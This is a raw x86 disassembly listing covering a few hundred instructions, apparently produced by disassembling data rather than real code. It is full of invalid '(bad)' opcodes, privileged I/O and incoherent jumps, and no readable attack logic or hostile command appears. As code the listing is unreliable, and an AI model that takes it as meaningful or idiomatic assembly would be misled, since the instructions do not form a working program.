  41b596:	mov    ds:0x6c59a754,al
  41b59b:	dec    eax
  41b59c:	xchg   edi,eax
  41b59d:	xor    al,0xaf
  41b59f:	push   ebx
  41b5a0:	arpl   WORD PTR [edi-0x2dc57d91],sp
  41b5a6:	sbb    esi,DWORD PTR [esi]
  41b5a8:	rcl    DWORD PTR [eax+esi*4-0x16],0xc2
  41b5ad:	mov    bl,0xf3
  41b5af:	dec    ecx
  41b5b0:	shl    DWORD PTR [ecx+0x7b],0x6e
  41b5b4:	push   0x995506dd
  41b5b9:	adc    al,0xb5
  41b5bb:	loope  0x41b5dc
  41b5bd:	fstp   DWORD PTR [edx]
  41b5bf:	dec    esi
  41b5c0:	push   edx
  41b5c1:	sti    
  41b5c2:	mov    edx,DWORD PTR [ecx-0x4da17772]
  41b5c8:	fidivr DWORD PTR [esi+0x6e]
  41b5cb:	sub    BYTE PTR [ebx],bh
  41b5cd:	cmc    
  41b5ce:	dec    esp
  41b5cf:	mov    ecx,0x18dfa018
  41b5d4:	cwde   
  41b5d5:	(bad)  
  41b5d6:	xchg   esi,eax
  41b5d7:	xor    BYTE PTR [edi+ebx*2],dl
  41b5da:	mov    eax,ds:0xa0394fee
  41b5df:	mov    fs,WORD PTR ds:0xce05bc31
  41b5e5:	inc    ecx
  41b5e6:	hlt    
  41b5e7:	icebp  
  41b5e8:	xlat   BYTE PTR ds:[ebx]
  41b5e9:	push   cs
  41b5ea:	push   edx
  41b5eb:	data16 (bad) 
  41b5ed:	fbstp  TBYTE PTR [ecx]
  41b5ef:	sbb    al,0xd5
  41b5f1:	push   0x1f553274
  41b5f6:	mov    cl,ch
  41b5f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f9:	cmp    eax,0x6cfcc0be
  41b5fe:	leave  
  41b5ff:	add    al,0x14
  41b601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b602:	inc    edx
  41b603:	xor    ebx,DWORD PTR [ebx+eiz*8+0x57]
  41b607:	mov    al,ds:0x2696ecc5
  41b60c:	repnz ins DWORD PTR es:[edi],dx
  41b60e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b60f:	mov    eax,ds:0x3c2a1306
  41b614:	add    edx,ecx
  41b616:	mov    eax,ds:0xec8e6254
  41b61b:	ret    0x92a4
  41b61e:	ds loop 0x41b690
  41b621:	rcr    DWORD PTR ds:0xecd705a2,0xf9
  41b628:	cs cli 
  41b62a:	shr    BYTE PTR [esi-0x56],cl
  41b62d:	push   edx
  41b62e:	sbb    ebx,esi
  41b630:	clc    
  41b631:	sti    
  41b632:	scas   eax,DWORD PTR es:[edi]
  41b633:	xchg   edx,eax
  41b634:	sub    edi,esi
  41b636:	push   0x9d126206
  41b63b:	adc    esp,DWORD PTR [ebx]
  41b63d:	fwait
  41b63e:	or     DWORD PTR [ecx+0x540fc18e],0xffffffa0
  41b645:	or     al,0xe5
  41b647:	in     al,dx
  41b648:	outs   dx,BYTE PTR ds:[esi]
  41b649:	icebp  
  41b64a:	pop    edx
  41b64b:	test   DWORD PTR [edx],esp
  41b64d:	mov    edx,DWORD PTR [ebx]
  41b64f:	jp     0x41b5d5
  41b651:	sbb    eax,0x13c32de4
  41b656:	ja     0x41b5fa
  41b658:	mov    ?,ebp
  41b65a:	jmp    0x0:0x5bf2
  41b661:	add    dh,al
  41b663:	aaa    
  41b664:	sti    
  41b665:	addr16 sti 
  41b667:	out    dx,eax
  41b668:	fidiv  WORD PTR [edi-0x5c01975c]
  41b66e:	cwde   
  41b66f:	hlt    
  41b670:	ret    
  41b671:	test   BYTE PTR [edx-0xcfffece],al
  41b677:	add    al,0x0
  41b679:	add    BYTE PTR [ecx],bh
  41b67b:	xchg   esi,eax
  41b67c:	test   BYTE PTR [ebp+eiz*2+0x2c],bh
  41b680:	in     eax,0xd9
  41b682:	loop   0x41b677
  41b684:	repz jl 0x41b635
  41b687:	mov    WORD PTR ds:0x1f24d020,es
  41b68d:	cmp    DWORD PTR [esi-0x68246346],esi
  41b693:	push   cs
  41b694:	jecxz  0x41b67c
  41b696:	(bad)  
  41b697:	out    0xaf,eax
  41b699:	std    
  41b69a:	or     al,0xd9
  41b69c:	push   esi
  41b69d:	pop    edx
  41b69e:	dec    edx
  41b69f:	dec    ebp
  41b6a0:	in     eax,0x8e
  41b6a2:	not    DWORD PTR [esi-0x48]
  41b6a5:	push   edx
  41b6a6:	xchg   edi,eax
  41b6a7:	fistp  WORD PTR ds:0x6fef1d2c
  41b6ad:	ins    BYTE PTR es:[edi],dx
  41b6ae:	and    al,0xa0
  41b6b0:	rol    BYTE PTR [esi+0x5e62ae06],cl
  41b6b6:	inc    ebx
  41b6b7:	pop    esp
  41b6b8:	jmp    0x64af11a
  41b6bd:	xchg   esi,eax
  41b6be:	jmp    0x9d33:0x4741364
  41b6c5:	push   edi
  41b6c6:	inc    ebp
  41b6c7:	ds test al,0x5f
  41b6ca:	dec    ebx
  41b6cb:	stos   BYTE PTR es:[edi],al
  41b6cc:	(bad)  
  41b6cd:	(bad)  
  41b6ce:	clc    
  41b6cf:	sahf   
  41b6d0:	jb     0x41b711
  41b6d2:	and    eax,0x53c95bef
  41b6d7:	out    dx,al
  41b6d8:	imul   ebp,DWORD PTR [ebp-0x5bb5f15c],0xfd42ae8b
  41b6e2:	inc    ebp
  41b6e3:	pop    ebp
  41b6e4:	push   cs
  41b6e5:	addr16 push ebp
  41b6e7:	arpl   WORD PTR [ebp-0x31],ax
  41b6ea:	(bad)  
  41b6eb:	sar    ebx,cl
  41b6ed:	fcomp  st(7)
  41b6ef:	mov    ds:0x625759ff,al
  41b6f4:	cwde   
  41b6f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6f6:	adc    ecx,ebp
  41b6f8:	pop    eax
  41b6f9:	or     eax,0x172634c3
  41b6fe:	lea    esi,[edx-0x49]
  41b701:	dec    edi
  41b702:	mov    bh,0x22
  41b704:	dec    ebx
  41b705:	pop    es
  41b706:	xor    esp,DWORD PTR [ebp*2-0x2ff103c1]
  41b70d:	mov    al,ds:0xd41b5c35
  41b712:	xchg   BYTE PTR [esi+0x6c1877fc],ch
  41b718:	rcr    BYTE PTR [ebp+0x26],1
  41b71b:	jb     0x41b6a3
  41b71d:	test   cl,bl
  41b71f:	cmp    ebx,eax
  41b721:	jbe    0x41b75e
  41b723:	mov    ah,0x9b
  41b725:	mov    ch,0x96
  41b727:	sbb    BYTE PTR ds:0xe3c1e9b4,0x63
  41b72e:	pop    esp
  41b72f:	push   ebp
  41b730:	clc    
  41b731:	stos   DWORD PTR es:[edi],eax
  41b732:	xor    eax,0x22940746
  41b737:	push   0xbb8dd61c
  41b73c:	je     0x41b73b
  41b73e:	daa    
  41b73f:	add    cl,BYTE PTR [esi+edx*4-0x1a]
  41b743:	aam    0x79
  41b745:	sar    BYTE PTR [esi-0x67],1
  41b748:	push   ss
  41b749:	bound  ecx,QWORD PTR [ebx+eiz*1]
  41b74c:	in     eax,dx
  41b74d:	add    BYTE PTR [edi-0x2b],0xce
  41b751:	fmul   DWORD PTR [eax+0x906b59e]
  41b757:	mov    eax,0x3cf13601
  41b75c:	xor    BYTE PTR [edi-0x18ddfd9b],ah
  41b762:	fisubr WORD PTR [eax-0x4e]
  41b765:	mov    esp,0xc8a8da60
  41b76a:	fcmovnu st,st(5)
  41b76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b76d:	mov    cl,ah
  41b76f:	xchg   DWORD PTR [ecx+0x4340a6ec],esp
  41b775:	pop    esi
  41b776:	xchg   ebx,eax
  41b777:	cdq    
  41b778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b779:	xor    DWORD PTR [edi+0x3f],0x1f
  41b77d:	push   eax
  41b77e:	pop    ebx
  41b77f:	xlat   BYTE PTR ds:[ebx]
  41b780:	push   cx
  41b782:	data16 aad 0xe0
  41b785:	fimul  DWORD PTR [ebp-0x52]
  41b788:	mov    al,ds:0xf56899bf
  41b78d:	fiadd  WORD PTR [ecx-0x5b1af10a]
  41b793:	les    esp,FWORD PTR [ecx+0x4862f7d3]
  41b799:	sti    
  41b79a:	pop    es
  41b79b:	adc    esp,DWORD PTR [eax]
  41b79d:	adc    edx,DWORD PTR ds:[ecx]
  41b7a0:	clc    
  41b7a1:	pusha  
  41b7a2:	sub    ebx,0xf6c7426e
  41b7a8:	push   0x19
  41b7aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7ab:	xor    al,0x95
  41b7ad:	es xor eax,0x64e3e29a
  41b7b3:	xor    al,0x9b
  41b7b5:	(bad)  
  41b7b6:	pop    edi
  41b7b7:	and    edi,esi
  41b7b9:	dec    ebp
  41b7ba:	or     ebp,DWORD PTR [esi-0x5f]
  41b7bd:	loop   0x41b7b5
  41b7bf:	jmp    0x83b1:0x1c542267
  41b7c6:	(bad)  
  41b7c7:	cli    
  41b7c8:	test   eax,0x55b96a5b
  41b7cd:	fcmovnb st,st(7)
  41b7cf:	sub    DWORD PTR [ecx+0x2fd57c40],0xdac2ce26
  41b7d9:	dec    edi
  41b7da:	sub    ah,dh
  41b7dc:	and    eax,0x77f74972
  41b7e1:	in     al,0x86
  41b7e3:	ret    0xd154
  41b7e6:	inc    ebp
  41b7e7:	dec    ecx
  41b7e8:	xchg   ebp,eax
  41b7e9:	out    dx,eax
  41b7ea:	loope  0x41b80c
  41b7ec:	and    al,0x4a
  41b7ee:	mov    esi,0xf48c03b3
  41b7f3:	cmp    al,0xb6
  41b7f5:	dec    edx
  41b7f6:	imul   eax,DWORD PTR [esi+0x58025ffb],0x245d89e
  41b800:	cld    
  41b801:	add    ch,BYTE PTR [ecx+0x2d]
  41b804:	or     BYTE PTR [edx],0x29
  41b807:	bound  edi,QWORD PTR [eax]
  41b809:	call   0xe7d4:0x82441015
  41b810:	jmp    0xd15e7201
  41b815:	imul   ebx,DWORD PTR ds:0x8b4dde1,0xffffffe4
  41b81c:	in     al,0xdd
  41b81e:	into   
  41b81f:	or     DWORD PTR [edx+edx*8+0x1f],esi
  41b823:	xchg   ebx,eax
  41b824:	cmc    
  41b825:	sub    edx,ecx
  41b827:	sub    al,0xd2
  41b829:	cdq    
  41b82a:	sti    
  41b82b:	pop    esp
  41b82c:	xor    al,0x1c
  41b82e:	or     BYTE PTR ds:0x2c9dbe15,al
  41b834:	xor    esp,ebx
  41b836:	push   cs
  41b837:	sub    BYTE PTR [ebp+0x27],dh
  41b83a:	(bad)  [edx+0x31]
  41b83d:	into   
  41b83e:	int3   
  41b83f:	(bad)  
  41b840:	fstp   TBYTE PTR [eax+0xf]
  41b843:	jne    0x41b896
  41b845:	ins    BYTE PTR es:[edi],dx
  41b846:	out    dx,eax
  41b847:	cld    
  41b848:	push   edi
  41b84a:	iret   
  41b84b:	xchg   eax,esp
  41b84d:	and    dl,al
  41b84f:	jecxz  0x41b85a
  41b851:	mov    al,ds:0xb2c6b835
  41b856:	xor    DWORD PTR [eax-0x6cdec3eb],esp
  41b85c:	push   ds
  41b85d:	fcomp  QWORD PTR [ecx+0x7f]
  41b860:	jmp    0x41b888
  41b862:	shr    DWORD PTR [ebx+0x65c95586],1
  41b868:	sub    BYTE PTR [ebp+0x60],ch
  41b86b:	pop    ecx
  41b86c:	mov    ebp,0xbb9de55f
  41b871:	dec    eax
  41b872:	stc    
  41b873:	gs test al,0xc7
  41b876:	pop    edi
  41b877:	mov    BYTE PTR [ecx],ah
  41b879:	cmp    dl,bl
  41b87b:	in     eax,dx
  41b87c:	cld    
  41b87d:	hlt    
  41b87e:	(bad)  
  41b87f:	jo     0x41b813
  41b881:	jmp    0x41b8ce
  41b883:	arpl   WORD PTR [eax+ecx*1+0x6d],ax
  41b887:	repnz lea eax,[ecx+0x78]
  41b88b:	push   eax
  41b88c:	mov    dl,0xe6
  41b88e:	out    0xe7,eax
  41b890:	and    eax,0x103fdc50
  41b895:	pop    edi
  41b896:	and    ebp,DWORD PTR [edx-0x1f5acc2f]
  41b89c:	sbb    al,0x57
  41b89e:	data16 mov cl,0x73
  41b8a1:	aad    0x42
  41b8a3:	sbb    edi,DWORD PTR [esp+0x345cc8e3]
  41b8aa:	icebp  
  41b8ab:	ud2    
  41b8ad:	pop    es
  41b8ae:	sub    eax,DWORD PTR [ecx]
  41b8b0:	dec    BYTE PTR [eax-0x3d]
  41b8b3:	sub    DWORD PTR [esi-0x29],edi
  41b8b6:	jg     0x41b916
  41b8b8:	call   0xe7a0c8a0
  41b8bd:	xor    ebp,ecx
  41b8bf:	pop    ss
  41b8c0:	add    al,0x85
  41b8c2:	jmp    0x41b866
  41b8c4:	sbb    al,0x29
  41b8c6:	dec    edx
  41b8c7:	push   ecx
  41b8c8:	and    BYTE PTR [ebx+eiz*1],al
  41b8cb:	jmp    0x2d29d8d3
  41b8d0:	icebp  
  41b8d1:	ins    BYTE PTR es:[edi],dx
  41b8d2:	std    
  41b8d3:	mov    cl,0x8a
  41b8d5:	cdq    
  41b8d6:	sbb    BYTE PTR [eax+edx*4],bh
  41b8d9:	mov    BYTE PTR ds:0x33414a16,bh
  41b8df:	outs   dx,BYTE PTR ds:[esi]
  41b8e0:	rol    DWORD PTR [esi],0xb3
  41b8e3:	push   0x2d
  41b8e5:	test   al,0xec
  41b8e7:	in     eax,dx
  41b8e8:	mov    ebx,DWORD PTR [edi+0x2ca480e2]
  41b8ee:	lahf   
  41b8ef:	jno    0x41b93f
  41b8f1:	dec    edi
  41b8f2:	push   ss
  41b8f3:	xor    DWORD PTR [ebx-0x45],edi
  41b8f6:	bound  ebx,QWORD PTR [edx+0x4c5fdc5d]
  41b8fc:	push   esp
  41b8fd:	dec    esi
  41b8ff:	cmovbe eax,DWORD PTR [eax+0x7c]
  41b903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b904:	pop    ds
  41b905:	in     eax,dx
  41b906:	xchg   edi,eax
  41b907:	int    0x5a
  41b909:	push   ecx
  41b90a:	jp     0x41b982
  41b90c:	pop    DWORD PTR [ecx-0x6a]
  41b90f:	imul   ebp,DWORD PTR [eax+0x57],0xc0ebdd25
  41b916:	xor    BYTE PTR [ecx-0x60],0x91
  41b91a:	inc    edx
  41b91b:	mov    esp,0x5aeaba55
  41b920:	das    
  41b921:	outs   dx,DWORD PTR ds:[esi]
  41b922:	inc    esi
  41b923:	out    0xdd,al
  41b925:	inc    ebx
  41b926:	scas   eax,DWORD PTR es:[edi]
  41b927:	iret   
  41b928:	mov    edi,0x251eff48
  41b92d:	sub    eax,0xefd7cde3
  41b932:	sub    ebp,ebp
  41b934:	push   edi
  41b935:	xchg   esi,eax
  41b936:	pop    esp
  41b937:	xor    al,0x54
  41b939:	adc    ebp,DWORD PTR [edi]
  41b93b:	push   ecx
  41b93c:	bound  eax,QWORD PTR [edi-0x2e7b5f94]
  41b942:	push   ecx
  41b943:	test   edx,ebp
  41b945:	or     eax,0xd0b64a36
  41b94a:	jecxz  0x41b905
  41b94c:	test   eax,0xc454f756
  41b951:	in     eax,dx
  41b952:	xor    cl,BYTE PTR [edx+0x1740cbf]
  41b958:	imul   ecx,eax,0xed3b6e99
  41b95e:	xor    al,BYTE PTR [esi]
  41b960:	(bad)  
  41b961:	shr    DWORD PTR [ebx+0x5a],1
  41b964:	ror    ecx,1
  41b966:	data16 aam 0xd5
  41b969:	outs   dx,BYTE PTR ds:[esi]
  41b96a:	pushf  
  41b96b:	sub    ah,BYTE PTR [ecx-0x31fe31e3]
  41b971:	clc    
  41b972:	push   esp
  41b973:	aaa    
  41b974:	mov    ebx,0x959f9c8f
  41b979:	mov    al,ds:0xa458075b
  41b97e:	mov    esi,0x17dc8c9c
  41b983:	sub    DWORD PTR [ecx-0x812ff51],0x342f2b0f
  41b98d:	inc    esi
  41b98e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b98f:	shl    edx,1
  41b991:	das    
  41b992:	hlt    
  41b993:	icebp  
  41b994:	lock mov eax,ds:0xe85d32f1
  41b99a:	inc    eax
  41b99b:	add    BYTE PTR [ecx-0x33],cl
  41b99e:	out    dx,eax
  41b99f:	sbb    edi,DWORD PTR [esi+ecx*8]
  41b9a2:	adc    DWORD PTR [esi],eax
  41b9a4:	out    dx,al
  41b9a5:	jecxz  0x41b9b8
  41b9a7:	ins    DWORD PTR es:[edi],dx
  41b9a8:	adc    eax,0x1e9fde9b
  41b9ad:	or     esp,DWORD PTR fs:[esi+0x64]
  41b9b1:	imul   esp,DWORD PTR [edi-0x77],0xfe55fd93
  41b9b8:	repnz fisub DWORD PTR [eax]
  41b9bb:	sub    al,dh
  41b9bd:	cs cli 
  41b9bf:	xchg   ebx,eax
  41b9c0:	inc    esi
  41b9c1:	add    ebp,DWORD PTR [esi+0x30]
  41b9c4:	pop    ecx
  41b9c5:	stos   BYTE PTR es:[edi],al
  41b9c6:	imul   esi,DWORD PTR [ebx],0x92ae3688
  41b9cc:	xor    esi,DWORD PTR [eax+edi*8+0x3a]
  41b9d0:	pusha  
  41b9d1:	xchg   ebx,eax
  41b9d2:	push   esi
  41b9d3:	into   
  41b9d4:	push   ebp
  41b9d5:	inc    ecx
  41b9d6:	xor    al,0xc9
  41b9d8:	inc    ecx
  41b9d9:	inc    edi
  41b9da:	es dec esi
  41b9dc:	int    0x4e
  41b9de:	dec    eax
  41b9df:	imul   edi,DWORD PTR [ebp+0xaf696c0],0xffffff8b
  41b9e6:	sbb    eax,0x2977f9a1
  41b9eb:	sub    esp,DWORD PTR [ecx]
  41b9ed:	sbb    BYTE PTR [ebp+0x14],al
  41b9f0:	mov    bl,0xb2
  41b9f2:	pusha  
  41b9f3:	test   eax,0x20f8c017
  41b9f8:	dec    esi
  41b9f9:	jmp    0x4ea1:0xbaebf9e0
  41ba00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba01:	dec    ebp
  41ba02:	mov    esi,DWORD PTR [esi]
  41ba04:	xor    eax,0x950e9dce
  41ba09:	jns    0x41b9c2
  41ba0b:	pop    es
  41ba0c:	mov    edx,esp
  41ba0e:	mov    dl,BYTE PTR [ebx+0x41]
  41ba11:	mov    cl,0x50
  41ba13:	xlat   BYTE PTR ds:[ebx]
  41ba14:	mov    eax,ds:0x6129ef61
  41ba19:	jb     0x41b9cb
  41ba1b:	pop    ebp
  41ba1c:	mov    dh,0x27
  41ba1e:	stc    
  41ba1f:	shl    DWORD PTR [eax+0x11],1
  41ba22:	hlt    
  41ba23:	mov    cl,0xba
  41ba25:	mov    edx,0x6d3d8d37
  41ba2a:	adc    ah,BYTE PTR [eax]
  41ba2c:	add    dl,BYTE PTR [edx+0x7e]
  41ba2f:	cli    
  41ba30:	xchg   esi,eax
  41ba31:	lds    esi,FWORD PTR [edi-0x187dba14]
  41ba37:	dec    ebx
  41ba38:	jmp    0x84be:0x3979069
  41ba3f:	shl    BYTE PTR [edi],cl
  41ba41:	sub    ecx,DWORD PTR [eax-0x30]
  41ba44:	pop    edx
  41ba45:	nop
  41ba46:	popf   
  41ba47:	pusha  
  41ba48:	or     DWORD PTR [ecx],eax
  41ba4a:	or     BYTE PTR [ebx],dh
  41ba4c:	cwde   
  41ba4d:	mov    ecx,0x5f813641
  41ba52:	mov    eax,DWORD PTR [ebp+0x21]
  41ba55:	nop
  41ba56:	add    dl,BYTE PTR [eax+edi*8+0xe]
  41ba5a:	retf   0x99c7
  41ba5d:	mov    ds:0xa91f8e3d,al
  41ba62:	sbb    al,0x94
  41ba64:	mov    ebp,0xfe9f7e99
  41ba69:	push   ecx
  41ba6a:	mov    ecx,0x64bd76f2
  41ba6f:	mov    WORD PTR [edx-0x56c807a3],es
  41ba75:	cmp    cl,al
  41ba77:	and    DWORD PTR [ebp+0x3fb283fe],esp
  41ba7d:	mov    ebx,cs
  41ba7f:	scas   eax,DWORD PTR es:[edi]
  41ba80:	pop    ds
  41ba81:	inc    esi
  41ba82:	xor    dh,BYTE PTR [edx-0xb]
  41ba85:	fiadd  DWORD PTR [ecx]
  41ba87:	sbb    ecx,DWORD PTR [ecx+0x7fe64a35]
  41ba8d:	(bad)  
  41ba8e:	shl    dl,1
  41ba90:	in     al,dx
  41ba91:	dec    BYTE PTR [ebp+0x72239574]
  41ba97:	pop    edx
  41ba98:	mov    eax,0x4b12250e
  41ba9d:	mov    ah,BYTE PTR [ebx-0x490db0ea]
  41baa3:	push   0x99cc7536
  41baa8:	jg     0x41badc
  41baaa:	dec    eax
  41baab:	ret    0x6139
  41baae:	arpl   WORD PTR [edi+eiz*1-0x49276f6d],sp
  41bab5:	test   eax,0xcb6356bf
  41baba:	or     ah,BYTE PTR [eax-0xb5d441d]
  41bac0:	pop    ss
  41bac1:	mov    al,0xc2
  41bac3:	mov    ah,0xfe
  41bac5:	add    BYTE PTR [ebx+0x32],dh
  41bac8:	jmp    0x739db7f9
  41bacd:	aad    0x40
  41bacf:	and    BYTE PTR [esi],0x61
  41bad2:	xchg   edx,eax
  41bad3:	pop    edi
  41bad4:	or     eax,0x490d6bf7
  41bad9:	popf   
  41bada:	cmp    ah,al
  41badc:	pminub mm5,QWORD PTR ds:0x4842d6f6
  41bae3:	jle    0x41bb57
  41bae5:	fwait
  41bae6:	pop    ss
  41bae7:	cmp    al,0x8c
  41bae9:	dec    esp
  41baea:	mov    esp,0x1867886
  41baef:	cmp    BYTE PTR [esi+ebp*8+0x79f11d43],bl
  41baf6:	or     al,0x90
  41baf8:	cmp    DWORD PTR ds:0x8b53cf58,0x75
  41baff:	ins    BYTE PTR es:[edi],dx
  41bb00:	mov    fs,WORD PTR [ebx]
  41bb02:	push   eax
  41bb03:	add    DWORD PTR [ecx],0xa114f07e
  41bb09:	mov    ch,0xdf
  41bb0b:	push   0xb9977791
  41bb10:	out    dx,al
  41bb11:	xchg   esi,eax
  41bb12:	or     ecx,edi
  41bb14:	cmp    al,0xeb
  41bb16:	and    DWORD PTR cs:[ecx-0x49],esp
  41bb1a:	(bad)  
  41bb1b:	aam    0x62
  41bb1d:	stos   DWORD PTR es:[edi],eax
  41bb1e:	std    
  41bb1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb20:	retf   
  41bb21:	fsub   DWORD PTR [edi-0x39a2bfd8]
  41bb27:	test   dl,cl
  41bb29:	adc    eax,0xaa8ec86c
  41bb2e:	xchg   ah,ch
  41bb30:	into   
  41bb31:	lahf   
  41bb32:	sbb    eax,0xdad7b99e
  41bb37:	leave  
  41bb38:	add    DWORD PTR ds:0x9073a0e4,ebx
  41bb3e:	fdivr  st,st(5)
  41bb40:	shl    edi,0xd4
  41bb43:	mov    ds:0x295f2db2,eax
  41bb48:	mov    al,ds:0xd6de915a
  41bb4d:	les    ebx,FWORD PTR [edx+0x554e3b5f]
  41bb53:	and    dl,dh
  41bb55:	jo     0x41bbb3
  41bb57:	loopne 0x41bb7c
  41bb59:	outs   dx,BYTE PTR ds:[esi]
  41bb5a:	pop    ss
  41bb5b:	js     0x41bbc1
  41bb5d:	imul   DWORD PTR [ebx]
  41bb5f:	sar    BYTE PTR [ebp+0x6c],1
  41bb62:	ret    
  41bb63:	out    0xb3,eax
  41bb65:	xchg   ebp,eax
  41bb66:	stc    
  41bb67:	jno    0x41bbc5
  41bb69:	imul   edx,DWORD PTR [ebp+0xe373],0xe6000000
  41bb73:	inc    eax
  41bb74:	sbb    eax,0xee5dbf15
  41bb79:	repz adc eax,0x38442583
  41bb7f:	dec    edx
  41bb80:	fxch   st(6)
  41bb82:	jne    0x41bbbb
  41bb84:	add    DWORD PTR [eax],eax
  41bb86:	repz add al,0x0
  41bb89:	add    BYTE PTR [edx],dl
  41bb8b:	mov    ah,0x90
  41bb8d:	pusha  
  41bb8e:	add    DWORD PTR [edi],0x5c7d87bc
  41bb94:	mov    ecx,0xccfe0dd5
  41bb99:	aaa    
  41bb9a:	mov    esi,0x2b723f46
  41bb9f:	fdiv   DWORD PTR [edx]
  41bba1:	adc    BYTE PTR [ecx+0x6049797d],ah
  41bba7:	cmp    DWORD PTR [esi+0x7b],edx
  41bbaa:	lea    eax,[ecx]
  41bbac:	imul   edx,eax,0xffffffcd
  41bbaf:	xchg   ebp,eax
  41bbb0:	test   ebx,esp
  41bbb2:	dec    eax
  41bbb3:	lock mov ah,0xe4
  41bbb6:	jecxz  0x41bb96
  41bbb8:	mov    bl,0x4
  41bbba:	sbb    BYTE PTR [edx-0x4f],dl
  41bbbd:	bsr    edx,DWORD PTR [ebx+0x401e8d75]
  41bbc4:	mov    ecx,0x15e28563
  41bbc9:	jbe    0x41bb8d
  41bbcb:	pop    eax
  41bbcc:	jp     0x41bc3d
  41bbce:	out    dx,al
  41bbcf:	addr16 jl 0x41bbc4
  41bbd2:	sbb    eax,0xecfab75c
  41bbd7:	nop
  41bbd8:	xor    cl,BYTE PTR [ebx]
  41bbda:	push   eax
  41bbdb:	dec    ebx
  41bbdc:	mov    edx,0x1f3d8ba5
  41bbe1:	add    al,bh
  41bbe3:	das    
  41bbe4:	lods   al,BYTE PTR ds:[esi]
  41bbe5:	cmc    
  41bbe6:	sbb    eax,0x97709ff6
  41bbeb:	add    bl,BYTE PTR [edx+0x5ebc2acd]
  41bbf1:	push   es
  41bbf2:	ds inc esi
  41bbf4:	stos   DWORD PTR es:[edi],eax
  41bbf5:	xor    al,0xfa
  41bbf7:	(bad)  
  41bbf8:	xchg   ebx,eax
  41bbf9:	and    DWORD PTR [ebx+0x79f28a2c],0xffffff9c
  41bc00:	test   BYTE PTR [ecx+0x11ee399e],ch
  41bc06:	add    esi,DWORD PTR [esi]
  41bc08:	rcl    DWORD PTR [edx-0x2],1
  41bc0b:	clc    
  41bc0c:	mov    ah,0xd0
  41bc0e:	xchg   BYTE PTR [edi-0x51570c44],bh
  41bc14:	(bad)  
  41bc15:	ins    DWORD PTR es:[edi],dx
  41bc16:	sub    esp,esi
  41bc18:	popf   
  41bc19:	(bad)  
  41bc1b:	dec    esp
  41bc1c:	jecxz  0x41bc53
  41bc1e:	mov    esp,ebx
  41bc20:	cmp    al,0x21
  41bc22:	loopne 0x41bc73
  41bc24:	pusha  
  41bc25:	inc    edx
  41bc26:	push   es
  41bc27:	adc    dl,dl
  41bc29:	das    
  41bc2a:	sbb    DWORD PTR [ebp-0x73],eax
  41bc2d:	fdiv   QWORD PTR ds:0xcb9080c2
  41bc33:	dec    edi
  41bc34:	lods   al,BYTE PTR ds:[esi]
  41bc35:	adc    al,0x35
  41bc37:	pop    edx
  41bc38:	push   esp
  41bc39:	int    0xed
  41bc3b:	outs   dx,BYTE PTR ds:[esi]
  41bc3c:	shl    DWORD PTR [ecx+0x6862e87f],cl
  41bc42:	push   ebp
  41bc43:	imul   eax,DWORD PTR [edi-0x52],0x25
  41bc47:	cld    
  41bc48:	aad    0x21
  41bc4a:	call   0x8e8648fc
  41bc4f:	stc    
  41bc50:	test   DWORD PTR [edx],esp
  41bc52:	mov    ebp,0x39b6f8f4
  41bc57:	sub    bl,ch
  41bc59:	out    dx,eax
  41bc5a:	jne    0x41bc1e
  41bc5c:	push   esp
  41bc5d:	jecxz  0x41bc1b
  41bc5f:	shl    BYTE PTR [ebp-0x3d],1
  41bc62:	imul   BYTE PTR [edi-0x63]
  41bc65:	xchg   esi,eax
  41bc66:	cwde   
  41bc67:	shufps xmm4,XMMWORD PTR ds:0x57a98a35,0x52
  41bc6f:	mov    al,0x0
  41bc71:	xchg   ebx,eax
  41bc72:	inc    ecx
  41bc73:	and    edx,DWORD PTR [eax+0x8]
  41bc76:	mov    BYTE PTR [ebp-0x4988a2b4],al
  41bc7c:	dec    esi
  41bc7d:	sbb    ch,ch
  41bc7f:	xchg   ecx,eax
  41bc80:	mov    bh,0x2d
  41bc82:	rcl    BYTE PTR [ebp+esi*4-0x7ae8e1e],cl
  41bc89:	pop    eax
  41bc8a:	pop    edi
  41bc8b:	pushf  
  41bc8c:	sbb    bh,BYTE PTR [edx-0x6d092f4]
  41bc92:	aad    0xf0
  41bc94:	fwait
  41bc95:	or     al,0x68
  41bc97:	(bad)  
  41bc98:	adc    eax,0x761633a9
  41bc9d:	pusha  
  41bc9e:	pop    eax
  41bc9f:	push   esp
  41bca0:	inc    ecx
  41bca1:	pop    ss
  41bca2:	push   esi
  41bca3:	pusha  
  41bca4:	pop    edi
  41bca5:	sbb    eax,0xc20e564f
  41bcaa:	xchg   ebx,eax
  41bcab:	and    bl,BYTE PTR [eax-0x65]
  41bcae:	sti    
  41bcaf:	inc    esi
  41bcb0:	jle    0x41bc3a
  41bcb2:	cmp    al,0xd8
  41bcb4:	mov    ss,WORD PTR [ebx+0x37]
  41bcb7:	loop   0x41bc9d
  41bcb9:	xchg   ebx,eax
  41bcba:	inc    ecx
  41bcbb:	std    
  41bcbc:	test   eax,0xdc517bd0
  41bcc1:	dec    ecx
  41bcc2:	ins    BYTE PTR es:[edi],dx
  41bcc3:	cmp    eax,0x7f496246
  41bcc8:	(bad)  
  41bcc9:	jle    0x41bc8a
  41bccb:	lea    ecx,[ecx]
  41bccd:	sbb    al,0xd0
  41bccf:	lahf   
  41bcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcd1:	adc    BYTE PTR [ebx+0x6afa3c2a],0xd8
  41bcd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcd9:	mov    edi,0x12047cbd
  41bcde:	xchg   DWORD PTR [edx+esi*2],ebp
  41bce1:	(bad)  
  41bce2:	jl     0x41bd1a
  41bce4:	xchg   esi,eax
  41bce5:	lock push DWORD PTR [esi+0x9]
  41bce9:	int3   
  41bcea:	ins    BYTE PTR es:[edi],dx
  41bceb:	xchg   ebp,eax
  41bcec:	mov    ebx,0x8c2c11e0
  41bcf1:	pop    eax
